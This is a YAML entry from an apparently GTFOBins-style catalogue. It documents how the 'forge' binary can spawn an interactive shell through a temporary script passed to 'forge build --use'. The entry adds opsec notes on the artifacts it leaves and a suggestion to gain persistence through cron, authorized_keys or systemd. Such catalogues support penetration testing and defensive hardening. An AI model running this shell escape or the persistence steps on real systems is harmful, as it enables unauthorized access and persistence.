---
name: forge
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo '#!/bin/sh' >/path/to/temp-file
    echo -e "/bin/sh <$(tty) >$(tty) 2>$(tty)" >>/path/to/temp-file
    chmod +x /path/to/temp-file
    forge build --use /path/to/temp-file
references:
- https://gtfobins.github.io/gtfobins/forge/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
